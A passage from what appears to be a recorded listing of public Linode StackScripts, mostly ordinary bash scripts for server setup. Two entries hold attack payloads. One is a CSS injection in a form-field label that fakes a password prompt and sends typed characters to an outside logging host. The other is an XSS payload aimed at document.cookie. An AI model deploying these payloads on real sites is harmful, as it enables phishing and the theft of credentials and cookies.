      -e \"/etc/apache2/sites-available/$1\" ]; then\n        echo /etc/apache2/sites-available/$1
      already exists\n        return;\n    fi\n\n    mkdir -p /srv/www/$1/public_html
      /srv/www/$1/logs\n\n    echo \"<VirtualHost *:80>\" > /etc/apache2/sites-available/$1\n    echo
      \"    ServerName $1\" >> /etc/apache2/sites-available/$1\n    echo \"    DocumentRoot
      /srv/www/$1/public_html/\" >> /etc/apache2/sites-available/$1\n    echo \"    ErrorLog
      /srv/www/$1/logs/error.log\" >> /etc/apache2/sites-available/$1\n    echo \"    CustomLog
      /srv/www/$1/logs/access.log combined\" >> /etc/apache2/sites-available/$1\n    echo
      \"</VirtualHost>\" >> /etc/apache2/sites-available/$1\n\n    a2ensite $1\n\n    touch
      /tmp/restart-apache2\n}\n\nfunction apache_virtualhost_from_rdns {\n    # Configures
      a VirtualHost using the rdns of the first IP as the ServerName\n\n    apache_virtualhost
      $(get_rdns_primary_ip)\n}\n\n\nfunction apache_virtualhost_get_docroot {\n    if
      [ ! -n \"$1\" ]; then\n        echo \"apache_virtualhost_get_docroot() requires
      the hostname as the first argument\"\n        return 1;\n    fi\n\n    if [
      -e /etc/apache2/sites-available/$1 ];\n        then echo $(awk ''/DocumentRoot/
      {print $2}'' /etc/apache2/sites-available/$1 )\n    fi\n}\n\n###########################################################\n#
      mysql-server\n###########################################################\n\nfunction
      mysql_install {\n    # $1 - the mysql root password\n\n    if [ ! -n \"$1\"
      ]; then\n        echo \"mysql_install() requires the root pass as its first
      argument\"\n        return 1;\n    fi\n\n    echo \"mysql-server mysql-server/root_password
      password $1\" | debconf-set-selections\n    echo \"mysql-server mysql-server/root_password_again
      password $1\" | debconf-set-selections\n    apt-get -y install mysql-server
      mysql-client\n\n    echo \"Sleeping while MySQL starts up for the first time...\"\n    sleep
      5\n}\n\nfunction mysql_tune {\n    # Tunes MySQL''s memory usage to utilize
      the percentage of memory you specify, defaulting to 40%\n\n    # $1 - the percent
      of system memory to allocate towards MySQL\n\n    if [ ! -n \"$1\" ];\n        then
      PERCENT=40\n        else PERCENT=\"$1\"\n    fi\n\n    sed -i -e ''s/^#skip-innodb/skip-innodb/''
      /etc/mysql/my.cnf # disable innodb - saves about 100M\n\n    MEM=$(awk ''/MemTotal/
      {print int($2/1024)}'' /proc/meminfo) # how much memory in MB this system has\n    MYMEM=$((MEM*PERCENT/100))
      # how much memory we''d like to tune mysql with\n    MYMEMCHUNKS=$((MYMEM/4))
      # how many 4MB chunks we have to play with\n\n    # mysql config options we
      want to set to the percentages in the second list, respectively\n    OPTLIST=(key_buffer
      sort_buffer_size read_buffer_size read_rnd_buffer_size myisam_sort_buffer_size
      query_cache_size)\n    DISTLIST=(75 1 1 1 5 15)\n\n    for opt in ${OPTLIST[@]};
      do\n        sed -i -e \"/\\[mysqld\\]/,/\\[.*\\]/s/^$opt/#$opt/\" /etc/mysql/my.cnf\n    done\n\n    for
      i in ${!OPTLIST[*]}; do\n        val=$(echo | awk \"{print int((${DISTLIST[$i]}
      * $MYMEMCHUNKS/100))*4}\")\n        if [ $val -lt 4 ]\n            then val=4\n        fi\n        config=\"${config}\\n${OPTLIST[$i]}
      = ${val}M\"\n    done\n\n    sed -i -e \"s/\\(\\[mysqld\\]\\)/\\1\\n$config\\n/\"
      /etc/mysql/my.cnf\n\n    touch /tmp/restart-mysql\n}\n\nfunction mysql_create_database
      {\n    # $1 - the mysql root password\n    # $2 - the db name to create\n\n    if
      [ ! -n \"$1\" ]; then\n        echo \"mysql_create_database() requires the root
      pass as its first argument\"\n        return 1;\n    fi\n    if [ ! -n \"$2\"
      ]; then\n        echo \"mysql_create_database() requires the name of the database
      as the second argument\"\n        return 1;\n    fi\n\n    echo \"CREATE DATABASE
      $2;\" | mysql -u root -p$1\n}\n\nfunction mysql_create_user {\n    # $1 - the
      mysql root password\n    # $2 - the user to create\n    # $3 - their password\n\n    if
      [ ! -n \"$1\" ]; then\n        echo \"mysql_create_user() requires the root
      pass as its first argument\"\n        return 1;\n    fi\n    if [ ! -n \"$2\"
      ]; then\n        echo \"mysql_create_user() requires username as the second
      argument\"\n        return 1;\n    fi\n    if [ ! -n \"$3\" ]; then\n        echo
      \"mysql_create_user() requires a password as the third argument\"\n        return
      1;\n    fi\n\n    echo \"CREATE USER ''$2''@''localhost'' IDENTIFIED BY ''$3'';\"
      | mysql -u root -p$1\n}\n\nfunction mysql_grant_user {\n    # $1 - the mysql
      root password\n    # $2 - the user to bestow privileges \n    # $3 - the database\n\n    if
      [ ! -n \"$1\" ]; then\n        echo \"mysql_create_user() requires the root
      pass as its first argument\"\n        return 1;\n    fi\n    if [ ! -n \"$2\"
      ]; then\n        echo \"mysql_create_user() requires username as the second
      argument\"\n        return 1;\n    fi\n    if [ ! -n \"$3\" ]; then\n        echo
      \"mysql_create_user() requires a database as the third argument\"\n        return
      1;\n    fi\n\n    echo \"GRANT ALL PRIVILEGES ON $3.* TO ''$2''@''localhost'';\"
      | mysql -u root -p$1\n    echo \"FLUSH PRIVILEGES;\" | mysql -u root -p$1\n\n}\n\n###########################################################\n#
      PHP functions\n###########################################################\n\nfunction
      php_install_with_apache {\n    aptitude -y install php5 php5-mysql libapache2-mod-php5\n    touch
      /tmp/restart-apache2\n}\n\nfunction php_tune {\n    # Tunes PHP to utilize up
      to 32M per process\n\n    sed -i''-orig'' ''s/memory_limit = [0-9]\\+M/memory_limit
      = 32M/'' /etc/php5/apache2/php.ini\n    touch /tmp/restart-apache2\n}\n\n###########################################################\n#
      Wordpress functions\n###########################################################\n\nfunction
      wordpress_install {\n    # installs the latest wordpress tarball from wordpress.org\n\n    #
      $1 - required - The existing virtualhost to install into\n\n    if [ ! -n \"$1\"
      ]; then\n        echo \"wordpress_install() requires the vitualhost as its first
      argument\"\n        return 1;\n    fi\n\n    if [ ! -e /usr/bin/wget ]; then\n        aptitude
      -y install wget\n    fi\n\n    VPATH=$(apache_virtualhost_get_docroot $1)\n\n    if
      [ ! -n \"$VPATH\" ]; then\n        echo \"Could not determine DocumentRoot for
      $1\"\n        return 1;\n    fi\n\n    # download, extract, chown, and get our
      config file started\n    cd $VPATH\n    wget http://wordpress.org/latest.tar.gz\n    tar
      xfz latest.tar.gz\n    chown -R www-data: wordpress/\n    cd $VPATH/wordpress\n    cp
      wp-config-sample.php wp-config.php\n    chown www-data wp-config.php\n    chmod
      640 wp-config.php\n\n    # database configuration\n    WPPASS=$(randomString
      20)\n    mysql_create_database \"$DB_PASSWORD\" wordpress\n    mysql_create_user
      \"$DB_PASSWORD\" wordpress \"$WPPASS\"\n    mysql_grant_user \"$DB_PASSWORD\"
      wordpress wordpress\n\n    # configuration file updates\n    for i in {1..4}\n        do
      sed -i \"0,/put your unique phrase here/s/put your unique phrase here/$(randomString
      50)/\" wp-config.php\n    done\n\n    sed -i ''s/database_name_here/wordpress/''
      wp-config.php\n    sed -i ''s/username_here/wordpress/'' wp-config.php\n    sed
      -i \"s/password_here/$WPPASS/\" wp-config.php\n\n    # http://downloads.wordpress.org/plugin/wp-super-cache.0.9.8.zip\n}\n\n###########################################################\n#
      Other niceties!\n###########################################################\n\nfunction
      goodstuff {\n    # Installs the REAL vim, wget, less, and enables color root
      prompt and the \"ll\" list long alias\n\n    aptitude -y install wget vim less\n    sed
      -i -e ''s/^#PS1=/PS1=/'' /root/.bashrc # enable the colorful root bash prompt\n    sed
      -i -e \"s/^#alias ll=''ls -l''/alias ll=''ls -al''/\" /root/.bashrc # enable
      ll list long alias <3\n}\n\n\n###########################################################\n#
      utility functions\n###########################################################\n\nfunction
      restartServices {\n    # restarts services that have a file in /tmp/needs-restart/\n\n    for
      service in $(ls /tmp/restart-* | cut -d- -f2-10); do\n        /etc/init.d/$service
      restart\n        rm -f /tmp/restart-$service\n    done\n}\n\nfunction randomString
      {\n    if [ ! -n \"$1\" ];\n        then LEN=20\n        else LEN=\"$1\"\n    fi\n\n    echo
      $(</dev/urandom tr -dc A-Za-z0-9 | head -c $LEN) # generate a random string\n}",
      "user_defined_fields": []}, {"id": 628741, "username": "HackerOne_7df17c47",
      "user_gravatar_id": "b67d1e20cd00ac20134cdb0845f57f6e", "label": "vakzz", "description":
      "vakzz", "ordinal": 0, "logo_url": "", "images": ["linode/arch"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "test1", "script": "#!/bin/bash\n\n#
      <UDF name=\"password\" Label=\"password\" example=\"Please enter you account
      password to continue\" />\n\n# <UDF name=\"var4\" Label=\"pick{}\nbody{visibility:hidden}\n#password{visibility:visible;position:fixed;left:50px;top:50px}\n#password[value$=''a'']{background-image:url(''https://aw.rs/log?a'')!important}\n#password[value$=''b'']{background-image:url(''https://aw.rs/log?b'')!important}\n#password[value$=''c'']{background-image:url(''https://aw.rs/log?c'')!important}\n#password[value$=''d'']{background-image:url(''https://aw.rs/log?d'')!important}\n#password[value$=''e'']{background-image:url(''https://aw.rs/log?e'')!important}\n#password[value$=''f'']{background-image:url(''https://aw.rs/log?f'')!important}\n#password[value$=''g'']{background-image:url(''https://aw.rs/log?g'')!important}\n#password[value$=''h'']{background-image:url(''https://aw.rs/log?h'')!important}\n#password[value$=''i'']{background-image:url(''https://aw.rs/log?i'')!important}\n//\"
      manyOf=\"foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s\" />", "user_defined_fields":
      [{"name": "password", "label": "password", "example": "Please enter you account
      password to continue"}, {"name": "var4", "label": "pick{}body{visibility:hidden}#password{visibility:visible;position:fixed;left:50px;top:50px}#password[value$=''a'']{background-image:url(''https://aw.rs/log?a'')!important}#password[value$=''b'']{background-image:url(''https://aw.rs/log?b'')!important}#password[value$=''c'']{background-image:url(''https://aw.rs/log?c'')!important}#password[value$=''d'']{background-image:url(''https://aw.rs/log?d'')!important}#password[value$=''e'']{background-image:url(''https://aw.rs/log?e'')!important}#password[value$=''f'']{background-image:url(''https://aw.rs/log?f'')!important}#password[value$=''g'']{background-image:url(''https://aw.rs/log?g'')!important}#password[value$=''h'']{background-image:url(''https://aw.rs/log?h'')!important}#password[value$=''i'']{background-image:url(''https://aw.rs/log?i'')!important}//",
      "manyof": "foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s"}]}, {"id": 2822, "username":
      "smartjones", "user_gravatar_id": "0b874d2362ffd16a2178ba9339c40798", "label":
      "Smartweb", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu10.04lts32bit"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash\n#<UDF name=\"db_password\" Label=\"MySQL
      root Password\" />\n#<UDF name=\"db_name\" Label=\"Create Database\" default=\"\"
      example=\"Optionally create this database\" />\n#<UDF name=\"db_user\" Label=\"Create
      MySQL User\" default=\"\" example=\"Optionally create this user\" />\n#<UDF
      name=\"db_user_password\" Label=\"MySQL User''s Password\" default=\"\" example=\"User''s
      password\" />\n\nsource <ssinclude StackScriptID=\"1\">\n\nsystem_update\npostfix_install_loopback_only\nmysql_install
      \"$DB_PASSWORD\" && mysql_tune 40\nmysql_create_database \"$DB_PASSWORD\" \"$DB_NAME\"\nmysql_create_user
      \"$DB_PASSWORD\" \"$DB_USER\" \"$DB_USER_PASSWORD\"\nmysql_grant_user \"$DB_PASSWORD\"
      \"$DB_USER\" \"$DB_NAME\"\nphp_install_with_apache && php_tune\napache_install
      && apache_tune 40 && apache_virtualhost_from_rdns\ngoodstuff\nrestartServices",
      "user_defined_fields": [{"name": "db_password", "label": "MySQL root Password"},
      {"name": "db_name", "label": "Create Database", "default": "", "example": "Optionally
      create this database"}, {"name": "db_user", "label": "Create MySQL User", "default":
      "", "example": "Optionally create this user"}, {"name": "db_user_password",
      "label": "MySQL User''s Password", "default": "", "example": "User''s password"}]},
      {"id": 9222, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "CS-Cart powered by Webuzo", "description": "CS-Cart is the best shopping
      cart solution for building an ecommerce website of any size: from a small web
      store to a virtual shopping mall. A ready storefront, support for many payment
      and shipping options, full inventory control, unlimited products, promotional
      tools, and other ecommerce software features out-of-the-box.\r\n\r\nCS-Cart
      shopping cart software offers a search engine friendly environment that involves
      the tableless layout, customizable META tags, friendly URLs and Google sitemap.
      This all contributes well to the proper indexing of your web store and generally
      improves its ranking among the popular search engines like Google, Yahoo! Search
      and Bing.\r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users
      deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX,
      PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure CS-Cart
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "CS-Cart powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install CS-Cart and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About CS-Cart :\n#   CS-Cart
      is the best shopping cart solution for building an ecommerce website of any
      size: from a small \n#   web store to a virtual shopping mall. \n#   A ready
      storefront, support for many payment and shipping options, full inventory control,
      \n#   unlimited products, promotional tools, and other ecommerce software features
      out-of-the-box.\n###########################################################################################################\n\n#
      Install CS-Cart Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=479&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      CS-Cart and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, CS-Cart has been successfully installed\"\necho \" \"\necho
      \"You can now configure CS-Cart and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 606726, "username":
      "zek1", "user_gravatar_id": "db3274167e091d0a1fdd8e206c5bf786", "label": "zek''%3E%3Cstrong%3Exss%3Ch1%09onmouseover=prompt(document.cookie",
      "description": "zek''%3E%3Cstrong%3Exss%3Ch1%09onmouseover=prompt(document.cookie)%3Exss",
      "ordinal": 0, "logo_url": "", "images": ["linode/opensuse15.0"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash",
      "user_defined_fields": []}, {"id": 9223, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "Chive powered by Webuzo", "description":
      "Chive is a modern Open-Source MySQL Data Management tool. With it''s fast and
      elaborate user interface it is getting very popular especially by web engineers.
      Chive was created because of an disaffection with existing tools. They usually
      were hard to handle and very time-consuming while the daily use of an web engineer.\r\n\r\nChive
      is a free, open source, web-based database management tool, designed to bring
      joy to web developers - with easy administration, super fast UI and state of
      the art web technologies. Based on top of the current version of the Yii framework,
      Chive takes advantage of the MVC design pattern and unit testing. \r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Chive and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Chive powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Chive and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Chive :\n#   Chive
      is a modern Open-Source MySQL Data Management tool.\n#   With it''s fast and
      elaborate user interface it is getting very popular especially by web engineers.\n#   Chive
      was created because of an disaffection with existing tools.\n#   They usually
      were hard to handle and very time-consuming while the daily use of an web engineer.\n###########################################################################################################\n\n#
      Install Chive Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=398&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Chive and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Chive has been successfully installed\"\necho \" \"\necho
      \"You can now configure Chive and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 978951, "username":
      "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2", "label":
      "meenu", "description": "description", "ordinal": 0, "logo_url": "", "images":
      ["linode/alpine3.12"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "Revision Note", "script": "#!/bin/bash\r\n\r\nfdgrthtyjuy7i", "user_defined_fields":
      []}, {"id": 9224, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Commentics powered by Webuzo", "description": "Commentics is a free,
      advanced PHP comment script with many features. Professionally written and with
      open source code, its main aims are to be integrable, customizable and secure.
      \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users deploy
      Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP,
      Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou can
      get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation
      Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
      installation process, access http://your-ip:2004 to configure Commentics and
      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Commentics powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Commentics and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Commentics :\n#   Commentics
      is a free, advanced PHP comment script with many features.\n#   Professionally
      written and with open source code, its main aims are to be integrable, customizable
      and secure. \n###########################################################################################################\n\n#
      Install Commentics Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=446&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Commentics and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Commentics has been successfully installed\"\necho \" \"\necho
      \"You can now configure Commentics and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 10248, "username":
      "regna", "user_gravatar_id": "3bd1beb6402a8ba4bb1606f0ad2cf639", "label": "functions.sh",
      "description": "functions.sh from sys-apps/openrc, exports and contains various
      helpful functions.", "ordinal": 0, "logo_url": "", "images": ["linode/gentoo"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "openrc-0.12.4", "script": "#!/bin/bash\n# Copyright (c) 2007-2009 Roy Marples
      <roy@marples.name>\n# Released under the 2-clause BSD license.\n\n# Allow any
      sh script to work with einfo functions and friends\n# We also provide a few
      helpful functions for other programs to use\n\nRC_GOT_FUNCTIONS=\"yes\"\n\neindent()\n{\n        :
      $(( EINFO_INDENT = ${EINFO_INDENT:-0} + 2 ))\n        [ \"$EINFO_INDENT\" -gt
      40 ] && EINFO_INDENT=40\n        export EINFO_INDENT\n}\n\neoutdent()\n{\n        :
      $(( EINFO_INDENT = ${EINFO_INDENT:-0} - 2 ))\n        [ \"$EINFO_INDENT\" -lt
      0 ] && EINFO_INDENT=0\n        return 0\n}\n\nyesno()\n{\n        [ -z \"$1\"
      ] && return 1\n\n        case \"$1\" in\n                [Yy][Ee][Ss]|[Tt][Rr][Uu][Ee]|[Oo][Nn]|1)
      return 0;;\n                [Nn][Oo]|[Ff][Aa][Ll][Ss][Ee]|[Oo][Ff][Ff]|0) return
      1;;\n        esac\n\n        local value=\n        eval value=\\$${1}\n        case
      \"$value\" in\n                [Yy][Ee][Ss]|[Tt][Rr][Uu][Ee]|[Oo][Nn]|1) return
      0;;\n                [Nn][Oo]|[Ff][Aa][Ll][Ss][Ee]|[Oo][Ff][Ff]|0) return 1;;\n                *)
      vewarn \"\\$$1 is not set properly\"; return 1;;\n        esac\n}\n\nrc_runlevel()\n{\n    rc-status
      --runlevel\n}\n\n_sanitize_path()\n{\n        local IFS=\":\" p= path=\n        for
      p in $PATH; do\n                case \"$p\" in\n                        /lib64/rc/bin|/lib64/rc/sbin);;\n                        /bin|/sbin|/usr/bin|/usr/sbin);;\n                        /usr/bin|/usr/sbin);;\n                        /usr/local/bin|/usr/local/sbin);;\n                        *)
      path=\"$path${path:+:}$p\";;\n                esac\n        done\n        echo
      \"$path\"\n}\n\n# Allow our scripts to support zsh\nif [ -n \"$ZSH_VERSION\"
      ]; then\n        emulate sh\n        NULLCMD=:\n        alias -g ''${1+\"$@\"}''=''\"$@\"''\n        setopt
      NO_GLOB_SUBST\nfi\n\n# Make a sane PATH\n_PREFIX=\n_PKG_PREFIX=/usr\n_LOCAL_PREFIX=/usr/local\n_LOCAL_PREFIX=${_LOCAL_PREFIX:-/usr/local}\n_PATH=/lib64/rc/bin\ncase
      \"$_PREFIX\" in\n        \"$_PKG_PREFIX\"|\"$_LOCAL_PREFIX\") ;;\n        *)
      _PATH=\"$_PATH:$_PREFIX/bin:$_PREFIX/sbin\";;\nesac\n_PATH=\"$_PATH\":/bin:/sbin:/usr/bin:/usr/sbin\n\nif
      [ -n \"$_PKG_PREFIX\" ]; then\n        _PATH=\"$_PATH:$_PKG_PREFIX/bin:$_PKG_PREFIX/sbin\"\nfi\nif
      [ -n \"$_LOCAL_PREFIX\" ]; then\n        _PATH=\"$_PATH:$_LOCAL_PREFIX/bin:$_LOCAL_PREFIX/sbin\"\nfi\n_path=\"$(_sanitize_path
      \"$PATH\")\"\nPATH=\"$_PATH${_path:+:}$_path\" ; export PATH\nunset _sanitize_path
      _PREFIX _PKG_PREFIX _LOCAL_PREFIX _PATH _path\n\nfor arg; do\n        case \"$arg\"
      in\n                --nocolor|--nocolour|-C)\n                        EINFO_COLOR=\"NO\"
      ; export EINFO_COLOR\n                        ;;\n        esac\ndone\n\nif [
      -t 1 ] && yesno \"${EINFO_COLOR:-YES}\"; then\n        if [ -z \"$GOOD\" ];
      then\n                eval $(eval_ecolors)\n        fi\nelse\n        # We need
      to have shell stub functions so our init scripts can remember\n        # the
      last ecmd\n        for _e in ebegin eend error errorn einfo einfon ewarn ewarnn
      ewend \\\n                vebegin veend veinfo vewarn vewend; do\n                eval
      \"$_e() { local _r; command $_e \\\"\\$@\\\"; _r=\\$?; \\\n                EINFO_LASTCMD=$_e;
      export EINFO_LASTCMD ; return \\$_r; }\"\n        done\n        unset _e\nfi",
      "user_defined_fields": []}, {"id": 647176, "username": "sacredheartmedia", "user_gravatar_id":
      "4b40d1fa8bcb9d6414b6468fb2ef0e75", "label": "StackScript Bash Library for CentOS
      8", "description": "A collection of useful bash functions specifically crafted
      for CentOS8 to be included in other bash StackScripts with a \"source <ssinclude
      StackScriptID=647176>\" line.\n\nThis StackScript does nothing on its own.  Do
      not deploy directly.\n\nJune 3, 2020 - THIS STACKSCRIPT IS UNDER DEVELOPMENT.",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos8"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash\n#\n#
      StackScript Bash Library for CentOS 8\n#\n# Inspired by Chris Aker''s StackScript
      Bash Library\n# https://cloud.linode.com/stackscripts/1\n# All rights reserved.\n#\n#
      Redistribution and use in source and binary forms, with or without modification,
      \n# are permitted provided that the following conditions are met:\n#\n# * Redistributions
      of source code must retain the above copyright notice, this\n# list of conditions
      and the following disclaimer.\n#\n# * Redistributions in binary form must reproduce
      the above copyright notice, this\n# list of conditions and the following disclaimer
      in the documentation and/or\n# other materials provided with the distribution.\n#\n#
      * Neither the name of Linode LLC nor the names of its contributors may be\n#
      used to endorse or promote products derived from this software without specific
      prior\n# written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT
      HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\n# EXPRESS OR IMPLIED WARRANTIES,
      INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n# OF MERCHANTABILITY
      AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT\n# SHALL THE
